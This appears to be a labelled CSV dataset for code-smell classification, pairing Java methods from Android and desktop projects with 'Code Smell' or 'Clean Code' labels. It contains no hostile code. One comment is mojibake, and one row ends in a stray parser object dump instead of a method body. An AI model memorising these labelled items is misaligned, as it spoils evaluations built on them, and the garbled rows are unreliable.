text,label,text_label
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  Arguments arguments=Arguments.fromArgs(args);
  int repetitions=arguments.getInteger(""bench_repetitions"",""number of repetitions"",10);
  int nrTileReads=arguments.getInteger(""bench_nr_tile_reads"",""number of tiles to read"",500_000);
  int preWarms=arguments.getInteger(""bench_pre_warms"",""number of pre warm runs"",3);
  List<Path> mbtilesPaths=arguments.getList(""bench_mbtiles"",""the mbtiles file to read from"",List.of()).stream().map(Paths::get).toList();
  if (mbtilesPaths.isEmpty()) {
    throw new IllegalArgumentException(""pass one or many paths to the same mbtiles file"");
  }
  mbtilesPaths.stream().forEach(p -> {
    if (!Files.exists(p) || !Files.isRegularFile(p)) {
      throw new IllegalArgumentException(""%s does not exists"".formatted(p));
    }
  }
);
  List<TileCoord> randomCoordsToFetchPerRepetition=new LinkedList<>();
  do {
    try (var db=Mbtiles.newReadOnlyDatabase(mbtilesPaths.getFirst())){
      try (var statement=db.connection().prepareStatement(SELECT_RANDOM_COORDS)){
        statement.setInt(1,nrTileReads - randomCoordsToFetchPerRepetition.size());
        var rs=statement.executeQuery();
        while (rs.next()) {
          int x=rs.getInt(""tile_column"");
          int y=rs.getInt(""tile_row"");
          int z=rs.getInt(""zoom_level"");
          randomCoordsToFetchPerRepetition.add(TileCoord.ofXYZ(x,(1 << z) - 1 - y,z));
        }
      }
     }
   }
 while (randomCoordsToFetchPerRepetition.size() < nrTileReads);
  Map<Path,Double> avgReadOperationsPerSecondPerDb=new HashMap<>();
  for (  Path dbPath : mbtilesPaths) {
    List<ReadResult> results=new LinkedList<>();
    LOGGER.info(""working on {}"",dbPath);
    for (int preWarm=0; preWarm < preWarms; preWarm++) {
      readEachTile(randomCoordsToFetchPerRepetition,dbPath);
    }
    for (int rep=0; rep < repetitions; rep++) {
      results.add(readEachTile(randomCoordsToFetchPerRepetition,dbPath));
    }
    var readOperationsPerSecondStats=results.stream().mapToDouble(ReadResult::readOperationsPerSecond).summaryStatistics();
    LOGGER.info(""readOperationsPerSecondStats: {}"",readOperationsPerSecondStats);
    avgReadOperationsPerSecondPerDb.put(dbPath,readOperationsPerSecondStats.getAverage());
  }
  List<Path> keysSorted=avgReadOperationsPerSecondPerDb.entrySet().stream().sorted((o1,o2) -> o1.getValue().compareTo(o2.getValue())).map(Map.Entry::getKey).toList();
  LOGGER.info(""diffs"");
  for (int i=0; i < keysSorted.size() - 1; i++) {
    for (int j=i + 1; j < keysSorted.size(); j++) {
      Path db0=keysSorted.get(i);
      double avg0=avgReadOperationsPerSecondPerDb.get(db0);
      Path db1=keysSorted.get(j);
      double avg1=avgReadOperationsPerSecondPerDb.get(db1);
      double diff=avg1 * 100 / avg0 - 100;
      LOGGER.info(""\""{}\"" to \""{}\"": avg read operations per second improved by {}%"",db0,db1,diff);
    }
  }
}",1,Code Smell
"public boolean sign(File in,File out,int minSdk,boolean alignFileSize){
  ApkSigner.SignerConfig signerConfig=new ApkSigner.SignerConfig.Builder(""CERT"",mPrivateKey,Collections.singletonList(mCertificate)).build();
  ApkSigner.Builder builder=new ApkSigner.Builder(Collections.singletonList(signerConfig));
  builder.setInputApk(in);
  builder.setOutputApk(out);
  builder.setCreatedBy(""AppManager"");
  builder.setAlignFileSize(alignFileSize);
  if (minSdk != -1)   builder.setMinSdkVersion(minSdk);
  if (mSigSchemes.v1SchemeEnabled()) {
    builder.setV1SigningEnabled(true);
  }
  if (mSigSchemes.v2SchemeEnabled()) {
    builder.setV2SigningEnabled(true);
  }
  if (mSigSchemes.v3SchemeEnabled()) {
    builder.setV3SigningEnabled(true);
  }
  if (mSigSchemes.v4SchemeEnabled()) {
    if (mIdsigFile == null) {
      throw new RuntimeException(""idsig file is mandatory for v4 signature scheme."");
    }
    builder.setV4SigningEnabled(true);
    builder.setV4SignatureOutputFile(mIdsigFile);
  }
  ApkSigner signer=builder.build();
  Log.i(TAG,""SignApk: %s"",in);
  try {
    if (alignFileSize && !ZipAlign.verify(in,ZipAlign.ALIGNMENT_4,true)) {
      ZipAlign.align(in,ZipAlign.ALIGNMENT_4,true);
    }
    signer.sign();
    Log.i(TAG,""The signature is complete and the output file is %s"",out);
    return true;
  }
 catch (  Exception e) {
    Log.w(TAG,e);
    return false;
  }
}",0,Clean Code
"@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onUrlClick(url);
  }
 else {
    super.onClick(widget);
  }
}
@Override public void onClick(View widget){
  Object tag=widget.getTag(R.id.linkify_click_handler);
  if (tag != null) {
    ((LinkifyClickHandler)tag).onTimeClick(url);
  }
}
",0,Clean Code
"/** 
 * Relies upon allLeftIndices being sorted in ascending order. Undefined when it's not.
 * @param allLeftIndices The indices of the left branch.
 * @param buffer The buffer to write out the unused indices to.
 * @return A pair, with the first element the left branch and the second element the right branch.
 */
public Pair<InvertedFeature,InvertedFeature> split(IntArrayContainer allLeftIndices,IntArrayContainer buffer){
  int[] allLeftArray=allLeftIndices.array;
  int allLeftSize=allLeftIndices.size;
  int[] bufferArray=buffer.array;
  if (indices != null) {
    int[] leftIndices=new int[indices.length];
    int leftSize=0;
    int[] rightIndices=new int[indices.length];
    int rightSize=0;
    int bufferIdx=0;
    int curIndex=0;
    int j=0;
    for (int i=0; i < curSize; i++) {
      while ((j < allLeftSize) && ((curIndex=allLeftArray[j]) < indices[i])) {
        bufferArray[bufferIdx]=curIndex;
        bufferIdx++;
        j++;
      }
      if ((j < allLeftSize) && (allLeftArray[j] == indices[i])) {
        leftIndices[leftSize]=indices[i];
        leftSize++;
        j++;
      }
 else {
        rightIndices[rightSize]=indices[i];
        rightSize++;
      }
    }
    if (j < allLeftSize) {
      System.arraycopy(allLeftArray,j,bufferArray,bufferIdx,allLeftSize - j);
    }
    buffer.size=bufferIdx + (allLeftSize - j);
    allLeftIndices.size=0;
    InvertedFeature left, right;
    if (leftSize == 0) {
      left=null;
    }
 else     if (leftSize == 1) {
      left=new InvertedFeature(value,leftIndices[0]);
    }
 else {
      left=new InvertedFeature(value,Arrays.copyOf(leftIndices,leftSize));
    }
    if (rightSize == 0) {
      right=null;
    }
 else     if (rightSize == 1) {
      right=new InvertedFeature(value,rightIndices[0]);
    }
 else {
      right=new InvertedFeature(value,Arrays.copyOf(rightIndices,rightSize));
    }
    return new Pair<>(left,right);
  }
 else {
    boolean found=false;
    int i=0;
    while (!found && i < allLeftSize) {
      if (allLeftArray[i] == index) {
        found=true;
      }
 else {
        i++;
      }
    }
    if (found) {
      System.arraycopy(allLeftArray,0,bufferArray,0,i);
      i++;
      while (i < allLeftSize) {
        bufferArray[i - 1]=allLeftArray[i];
        i++;
      }
      if (i < allLeftSize - 1) {
        System.arraycopy(allLeftArray,i + 1,bufferArray,i,allLeftSize - i);
      }
      buffer.size=allLeftSize - 1;
      allLeftIndices.size=0;
      return new Pair<>(new InvertedFeature(value,index),null);
    }
 else {
      allLeftIndices.array=bufferArray;
      allLeftIndices.size=0;
      buffer.array=allLeftArray;
      buffer.size=allLeftSize;
      return new Pair<>(null,new InvertedFeature(value,index));
    }
  }
}",0,Clean Code
"/** 
 * 绉婚櫎绌虹櫧
 * @param data 鏁版嵁
 * @return int
 */
private static int removeWhiteSpace(char[] data){
  if (data == null) {
    return 0;
  }
  int newSize=0;
  int len=data.length;
  for (int i=0; i < len; i++) {
    if (!isWhiteSpace(data[i])) {
      data[newSize++]=data[i];
    }
  }
  return newSize;
}",0,Clean Code
"/** 
 * Construct paging return object
 * @param data object returned
 * @param total total number of items
 * @param pageNo page number
 * @param pageSize paging size
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,Long total,Long pageNo,Long pageSize){
  return new PageResult<>(data,total,pageNo,pageSize);
}
/** 
 * Construct paging return object
 * @param data object returned
 * @param total total number of items
 * @param pageNo page number
 * @param pageSize paging size
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,Long total,Integer pageNo,Integer pageSize){
  return new PageResult<>(data,total,pageNo,pageSize);
}
/** 
 * Construct paging return object
 * @param data object returned
 * @param total total number of items
 * @param param paging parameters
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,Long total,PageQueryParam param){
  return new PageResult<>(data,total,param.getPageNo(),param.getPageSize());
}
/** 
 * Construct paging return object Total number of items returned
 * @param data object returned
 * @param param paging parameters
 * @param < T > The returned object type
 * @return paging return object
 */
public static <T>PageResult<T> of(List<T> data,PageQueryParam param){
  return new PageResult<>(data,0L,param.getPageNo(),param.getPageSize());
}",0,Clean Code
"public static String formatDistance(float distance,int type){
  return formatDistance(distance,type,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7b4183e3",0,Clean Code
"public void writeLibrary(Collection<FuncInfo> functions,Map<String,List<String>> enumMap) throws IOException {
  try (BufferedWriter writer=Files.newBufferedWriter(dir.resolve(className + "".java""))){
    writer.append(""package "").append(packageName).append("";\n\n"");
    writer.append(""import com.sun.jna.Callback;\n"");
    writer.append(""import com.sun.jna.Library;\n"");
    writer.append(""import com.sun.jna.Pointer;\n"");
    writer.append(""import com.sun.jna.ptr.PointerByReference;\n"");
    writer.append(""import java.nio.ByteBuffer;\n"");
    writer.append(""import java.nio.FloatBuffer;\n"");
    writer.append(""import java.nio.IntBuffer;\n"");
    writer.append(""import java.nio.LongBuffer;\n"");
    writer.append(""\npublic interface "").append(className).append("" extends Library {\n\n"");
    for (    Map.Entry<String,List<String>> entry : enumMap.entrySet()) {
      String name=entry.getKey();
      writer.append(""\n    enum "").append(name).append("" {\n"");
      List<String> fields=entry.getValue();
      int count=0;
      for (      String field : fields) {
        writer.append(""        "").append(field);
        if (++count < fields.size()) {
          writer.append(',');
        }
        writer.append('\n');
      }
      writer.append(""    }\n"");
    }
    for (    TypeDefine typeDefine : typedefMap.values()) {
      if (typeDefine.isCallBack()) {
        String callbackName=typeDefine.getDataType().getType();
        String returnType=mapping.getProperty(callbackName);
        if (returnType == null) {
          returnType=typeDefine.getValue();
        }
        writer.append(""\n    interface "").append(callbackName);
        writer.append("" extends Callback {\n"");
        writer.append(""        "").append(returnType).append("" apply("");
        writeParameters(writer,callbackName,typeDefine.getParameters());
        writer.append("");\n"");
        writer.append(""    }\n"");
      }
    }
    for (    FuncInfo info : functions) {
      writeFunction(writer,info);
    }
    writer.append(""}\n"");
  }
 }",1,Code Smell
"public int getItemCountInternal(){
  if (foundContextBot != null && !inlineMediaEnabled) {
    return 1;
  }
  if (stickers != null) {
    return stickers.size();
  }
 else   if (searchResultBotContext != null) {
    return searchResultBotContext.size() + (searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null ? 1 : 0);
  }
 else   if (searchResultUsernames != null) {
    return searchResultUsernames.size();
  }
 else   if (searchResultHashtags != null) {
    return searchResultHashtags.size();
  }
 else   if (searchResultCommands != null || quickReplies != null) {
    return (quickReplies == null ? 0 : quickReplies.size()) + (searchResultCommands == null ? 0 : searchResultCommands.size());
  }
 else   if (searchResultSuggestions != null) {
    return searchResultSuggestions.size();
  }
  return 0;
}",0,Clean Code
"/** 
 * Appends multiple  {@link MediaSource}s to the playlist.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 */
public final synchronized void addMediaSources(Collection<MediaSource> mediaSources){
  addPublicMediaSources(mediaSourcesPublic.size(),mediaSources,null,null);
}
/** 
 * Appends multiple  {@link MediaSource}s to the playlist and executes a custom action on completion.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 * @param handler The {@link Handler} to run {@code onCompletionAction}.
 * @param onCompletionAction A {@link Runnable} which is executed immediately after the mediasources have been added to the playlist.
 */
public final synchronized void addMediaSources(Collection<MediaSource> mediaSources,Handler handler,Runnable onCompletionAction){
  addPublicMediaSources(mediaSourcesPublic.size(),mediaSources,handler,onCompletionAction);
}
/** 
 * Adds multiple  {@link MediaSource}s to the playlist.
 * @param index The index at which the new {@link MediaSource}s will be inserted. This index must be in the range of 0 &lt;= index &lt;=  {@link #getSize()}.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 */
public final synchronized void addMediaSources(int index,Collection<MediaSource> mediaSources){
  addPublicMediaSources(index,mediaSources,null,null);
}
/** 
 * Adds multiple  {@link MediaSource}s to the playlist and executes a custom action on completion.
 * @param index The index at which the new {@link MediaSource}s will be inserted. This index must be in the range of 0 &lt;= index &lt;=  {@link #getSize()}.
 * @param mediaSources A collection of {@link MediaSource}s to be added to the list. The media sources are added in the order in which they appear in this collection.
 * @param handler The {@link Handler} to run {@code onCompletionAction}.
 * @param onCompletionAction A {@link Runnable} which is executed immediately after the mediasources have been added to the playlist.
 */
public final synchronized void addMediaSources(int index,Collection<MediaSource> mediaSources,Handler handler,Runnable onCompletionAction){
  addPublicMediaSources(index,mediaSources,handler,onCompletionAction);
}",0,Clean Code
"private void processLoadedFilterPeersInternal(TLRPC.messages_Dialogs pinnedDialogs,TLRPC.messages_Dialogs pinnedRemoteDialogs,ArrayList<TLRPC.User> users,ArrayList<TLRPC.Chat> chats,ArrayList<MessagesController.DialogFilter> filtersToSave,SparseArray<MessagesController.DialogFilter> filtersToDelete,ArrayList<Integer> filtersOrder,HashMap<Integer,HashSet<Long>> filterDialogRemovals,HashSet<Integer> filtersUnreadCounterReset,Runnable onDone){
  boolean anythingChanged=false;
  putUsersAndChats(users,chats,true,false);
  for (int a=0, N=filtersToDelete.size(); a < N; a++) {
    deleteDialogFilterInternal(filtersToDelete.valueAt(a));
    anythingChanged=true;
  }
  for (  Integer id : filtersUnreadCounterReset) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(id);
    if (filter == null) {
      continue;
    }
    filter.pendingUnreadCount=-1;
  }
  for (  HashMap.Entry<Integer,HashSet<Long>> entry : filterDialogRemovals.entrySet()) {
    MessagesController.DialogFilter filter=dialogFiltersMap.get(entry.getKey());
    if (filter == null) {
      continue;
    }
    HashSet<Long> set=entry.getValue();
    for (    Long id : set) {
      filter.pinnedDialogs.delete(id);
    }
    anythingChanged=true;
  }
  for (int a=0, N=filtersToSave.size(); a < N; a++) {
    saveDialogFilterInternal(filtersToSave.get(a),false,true);
    anythingChanged=true;
  }
  boolean orderChanged=false;
  for (int a=0, N=dialogFilters.size(); a < N; a++) {
    MessagesController.DialogFilter filter=dialogFilters.get(a);
    int order=filtersOrder.indexOf(filter.id);
    if (filter.order != order) {
      filter.order=order;
      anythingChanged=true;
      orderChanged=true;
    }
  }
  if (orderChanged) {
    Collections.sort(dialogFilters,(o1,o2) -> {
      if (o1.order > o2.order) {
        return 1;
      }
 else       if (o1.order < o2.order) {
        return -1;
      }
      return 0;
    }
);
    saveDialogFiltersOrderInternal();
  }
  int remote=anythingChanged ? 1 : 2;
  calcUnreadCounters(true);
  getMessagesController().processLoadedDialogFilters(new ArrayList<>(dialogFilters),pinnedDialogs,pinnedRemoteDialogs,users,chats,null,remote,onDone);
}",1,Code Smell
"@Override public WorkflowProcess clone() throws CloneNotSupportedException {
  WorkflowProcess cloneProcess=(WorkflowProcess)super.clone();
  cloneProcess.setStartEvent((StartEvent)this.startEvent.clone());
  cloneProcess.setEndEvent((EndEvent)this.endEvent.clone());
  Map<String,WorkflowTask> nameToTaskMap=new HashMap<>();
  StartEvent startEvent=cloneProcess.getStartEvent();
  Map<WorkflowAction,List<ConditionNextElement>> workflowActionListMap=startEvent.getActionToNextElementMap();
  Queue<Map<WorkflowAction,List<ConditionNextElement>>> queue=new LinkedBlockingQueue<>();
  if (MapUtils.isNotEmpty(workflowActionListMap)) {
    queue.add(workflowActionListMap);
  }
  while (!queue.isEmpty()) {
    workflowActionListMap=queue.remove();
    for (    List<ConditionNextElement> conditionNextElements : workflowActionListMap.values()) {
      for (      ConditionNextElement conditionNextElement : conditionNextElements) {
        Element element=conditionNextElement.getElement();
        if (element instanceof WorkflowTask) {
          WorkflowTask workflowTask=(WorkflowTask)element;
          nameToTaskMap.put(workflowTask.getName(),workflowTask);
        }
        if (element instanceof NextableElement) {
          NextableElement nextableElement=(NextableElement)element;
          Map<WorkflowAction,List<ConditionNextElement>> childListMap=nextableElement.getActionToNextElementMap();
          if (MapUtils.isNotEmpty(childListMap)) {
            queue.add(childListMap);
          }
        }
      }
    }
  }
  cloneProcess.setNameToTaskMap(nameToTaskMap);
  Map<ProcessEvent,List<ProcessEventListener>> cloneListeners=Maps.newHashMap();
  cloneListeners.putAll(listeners);
  cloneProcess.listeners=cloneListeners;
  return cloneProcess;
}
",1,Code Smell
"private void insertTeslaUser(TeslaServiceUserDO teslaServiceUserDO){
  UserDO userDo=new UserDO();
  userDo.setEmpId(teslaServiceUserDO.getEmployeeId());
  String bucUserId=teslaServiceUserDO.getBucUserId();
  if (!StringUtils.isBlank(bucUserId)) {
    if (bucUserId.endsWith("".0"")) {
      bucUserId=bucUserId.substring(0,bucUserId.indexOf("".""));
    }
    userDo.setBucId(Long.parseLong(bucUserId));
  }
  userDo.setTenantId(Constants.DEFAULT_TENANT_ID);
  userDo.setLoginName(teslaServiceUserDO.getUsername());
  userDo.setNickName(teslaServiceUserDO.getNickname());
  userDo.setEmail(teslaServiceUserDO.getEmail());
  userDo.setPhone(teslaServiceUserDO.getMobilephone());
  userDo.setAliww(teslaServiceUserDO.getAliww());
  userDo.setGmtCreate(new Date());
  userDo.setIsLocked((byte)(userDo.getIsLocked() == 0 ? 1 : 0));
  userDo.setSecretKey(teslaServiceUserDO.getSecretkey());
  userDo.setUserId(UserUtil.getUserId(userDo));
  log.info(""insert user:{}"",userDo);
  userMapper.insert(userDo);
}",0,Clean Code
"private static FakeExtractorOutput consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  FakeExtractorOutput output=new FakeExtractorOutput();
  extractor.init(output);
  consumeTestData(extractor,input,timeUs,output,retryFromStartIfLive);
  return output;
}
private static void consumeTestData(Extractor extractor,FakeExtractorInput input,long timeUs,FakeExtractorOutput output,boolean retryFromStartIfLive) throws IOException, InterruptedException {
  extractor.seek(input.getPosition(),timeUs);
  PositionHolder seekPositionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (readResult != Extractor.RESULT_END_OF_INPUT) {
    try {
      seekPositionHolder.position=Long.MIN_VALUE;
      readResult=extractor.read(input,seekPositionHolder);
      if (readResult == Extractor.RESULT_SEEK) {
        long seekPosition=seekPositionHolder.position;
        Assertions.checkState(0 <= seekPosition && seekPosition <= Integer.MAX_VALUE);
        input.setPosition((int)seekPosition);
      }
    }
 catch (    SimulatedIOException e) {
      if (!retryFromStartIfLive) {
        continue;
      }
      boolean isOnDemand=input.getLength() != C.LENGTH_UNSET || (output.seekMap != null && output.seekMap.getDurationUs() != C.TIME_UNSET);
      if (isOnDemand) {
        continue;
      }
      input.setPosition(0);
      for (int i=0; i < output.numberOfTracks; i++) {
        output.trackOutputs.valueAt(i).clear();
      }
      extractor.seek(0,0);
    }
  }
}",0,Clean Code
"private List<Cue> getDisplayCues(){
  @Cue.AnchorType int positionAnchor=Cue.ANCHOR_TYPE_END;
  int cueBuilderCount=cueBuilders.size();
  List<Cue> cueBuilderCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilders.get(i).build(Cue.TYPE_UNSET);
    cueBuilderCues.add(cue);
    if (cue != null) {
      positionAnchor=Math.min(positionAnchor,cue.positionAnchor);
    }
  }
  List<Cue> displayCues=new ArrayList<>(cueBuilderCount);
  for (int i=0; i < cueBuilderCount; i++) {
    Cue cue=cueBuilderCues.get(i);
    if (cue != null) {
      if (cue.positionAnchor != positionAnchor) {
        cue=cueBuilders.get(i).build(positionAnchor);
      }
      displayCues.add(cue);
    }
  }
  return displayCues;
}",0,Clean Code
"@Override protected JPanel createDetailsView(JFileChooser fc){
  JPanel p=super.createDetailsView(fc);
  if (!SystemInfo.isWindows)   return p;
  JScrollPane scrollPane=null;
  for (  Component c : p.getComponents()) {
    if (c instanceof JScrollPane) {
      scrollPane=(JScrollPane)c;
      break;
    }
  }
  if (scrollPane == null)   return p;
  Component view=scrollPane.getViewport().getView();
  if (!(view instanceof JTable))   return p;
  JTable table=(JTable)view;
  TableCellRenderer defaultRenderer=table.getDefaultRenderer(Object.class);
  table.setDefaultRenderer(Object.class,new TableCellRenderer(){
    @Override public Component getTableCellRendererComponent(    JTable table,    Object value,    boolean isSelected,    boolean hasFocus,    int row,    int column){
      if (value instanceof String && ((String)value).startsWith(""\u200e"")) {
        String str=(String)value;
        char[] buf=new char[str.length()];
        int j=0;
        for (int i=0; i < buf.length; i++) {
          char ch=str.charAt(i);
          if (ch != '\u200e' && ch != '\u200f')           buf[j++]=ch;
        }
        value=new String(buf,0,j);
      }
      return defaultRenderer.getTableCellRendererComponent(table,value,isSelected,hasFocus,row,column);
    }
  }
);
  return p;
}",1,Code Smell
"public boolean openPhotosEditor(ArrayList<SendMessagesHelper.SendingMediaInfo> photoPathes,CharSequence caption){
  final ArrayList<MediaController.PhotoEntry> entries=new ArrayList<>();
  for (int a=0; a < photoPathes.size(); ++a) {
    SendMessagesHelper.SendingMediaInfo photoInfo=photoPathes.get(a);
    String path=null;
    if (photoInfo.path != null) {
      path=photoInfo.path;
    }
 else     if (photoInfo.uri != null) {
      if (path == null) {
        try {
          final File file=AndroidUtilities.generatePicturePath(isSecretChat(),"""");
          InputStream in=ApplicationLoader.applicationContext.getContentResolver().openInputStream(photoInfo.uri);
          FileOutputStream fos=new FileOutputStream(file);
          byte[] buffer=new byte[8 * 1024];
          int lengthRead;
          while ((lengthRead=in.read(buffer)) > 0) {
            fos.write(buffer,0,lengthRead);
            fos.flush();
          }
          in.close();
          fos.close();
          path=file.getAbsolutePath();
        }
 catch (        Exception e) {
          FileLog.e(e);
          continue;
        }
      }
    }
    if (path == null) {
      continue;
    }
    int orientation=0;
    try {
      ExifInterface ei=new ExifInterface(path);
      int exif=ei.getAttributeInt(ExifInterface.TAG_ORIENTATION,ExifInterface.ORIENTATION_NORMAL);
switch (exif) {
case ExifInterface.ORIENTATION_ROTATE_90:
        orientation=90;
      break;
case ExifInterface.ORIENTATION_ROTATE_180:
    orientation=180;
  break;
case ExifInterface.ORIENTATION_ROTATE_270:
orientation=270;
break;
}
}
 catch (Exception e) {
FileLog.e(e);
}
MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,path,orientation,photoInfo.isVideo,0,0,0);
if (a == photoPathes.size() - 1 && caption != null) {
entry.caption=caption;
}
entries.add(entry);
}
if (entries.isEmpty()) {
return false;
}
if (getParentActivity() != null) {
final boolean[] checked=new boolean[entries.size()];
Arrays.fill(checked,true);
PhotoViewer.getInstance().setParentActivity(this,themeDelegate);
PhotoViewer.getInstance().openPhotoForSelect(new ArrayList<>(entries),entries.size() - 1,0,false,new PhotoViewer.EmptyPhotoViewerProvider(){
@Override public ImageReceiver.BitmapHolder getThumbForPhoto(MessageObject messageObject,TLRPC.FileLocation fileLocation,int index){
return null;
}
@Override public void sendButtonPressed(int index,VideoEditedInfo videoEditedInfo,boolean notify,int scheduleDate,boolean forceDocument){
for (int i=entries.size() - 1; i >= 0; --i) {
if (!checked[i]) {
entries.remove(i);
}
}
sendPhotosGroup(entries,notify,scheduleDate,forceDocument);
}
@Override public int setPhotoChecked(int index,VideoEditedInfo videoEditedInfo){
return index;
}
@Override public boolean isPhotoChecked(int index){
return checked[index];
}
@Override public boolean canScrollAway(){
return false;
}
}
,this);
}
 else {
fillEditingMediaWithCaption(caption,null);
sendPhotosGroup(entries,false,0,false);
afterMessageSend();
}
return true;
}",1,Code Smell
